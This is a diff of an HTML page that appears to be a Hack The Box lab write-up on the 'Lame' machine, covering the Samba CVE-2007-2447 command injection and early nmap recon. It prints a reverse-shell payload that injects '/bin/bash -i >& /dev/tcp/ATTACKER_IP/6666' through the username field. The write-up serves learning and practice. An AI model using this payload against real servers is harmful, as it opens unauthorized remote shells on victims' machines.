@@ -6,10 +6,12 @@
     </head>
     <body class="body">
         <header>
-            <div class=""wrapper">
+            <p style="display: inline; text-align: right; color:white;">UNDER CONSTRUCTION</p>
+            <div class="wrapper">
                 <ul class="navbar">
-                    <li><a href="lame.html"  class="navbarLink">LAME</a></li>
-                    <li><a href="shocker.html"  class="navbarLink">SHOCKER</a></li>
+                    <li class="navbarLink"><a href="lame.html">LAME</a></li>
+                    <li class="navbarLink"><a href="shocker.html">SHOCKER</a></li>
+                    <li class="navbarLink"><a href="bashed.html">BASHED</a></li>
                 </ul>
             </div>
         </header>
@@ -51,7 +53,6 @@
                 </table>
             </div>
             <div class="wrapper text">
-                <p>The machine starts with the IP address 10.129.22.206.</p>
                 <h1>INTRODUCTION</h1>
                 <h2>Samba vulnerability CVE-2007-2447</h2>
                 <p>CVE-2007-2447 is a remote command injection vulnerability in Samba 3.0.0-3.0.25rc3 caused by a lack of input sanitization. It allows remote attackers to run commands by injecting backticked commands into the username parameter. These commands are not sanitized and are appended to a hardcoded call to</p> 
@@ -60,7 +61,10 @@
                 <p><code class="code">/`/bin/bash -i >& /dev/tcp/<span class="ip">ATTACKER_IP</span>/6666 0>&1`</code></p>
                 <p>as the username. The leading <code class="code">/</code> in the payload is used as a delimiter for the domain field in smbclient..</p>
                 <p><a href="https://0x00sec.org/t/cvexplained-cve-2007-2447/22748">https://0x00sec.org/t/cvexplained-cve-2007-2447/22748</a></p>
+            </div>
+            <div class="wrapper text">
                 <h1>RECON</h1>
+                <p><code>The victim machine has the IP: <span class="ip">10.129.22.206</span><br>The attack machine has the IP: <span class="ip">10.10.14.212</span></code></p>
                 <p>Starting with an enumeration of the available port we scan the TCP ports using nmap. We will also scan for all UDP ports. Once these scans are complete, we will run nmap again on the discovered TCP ports using version detection scripts.</p>
                 <ul>
                     <li>SYN scan (-sS) is the default scan type. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by restrictive firewalls. It is also relatively unobtrusive and stealthy since it never completes TCP connections.</li>
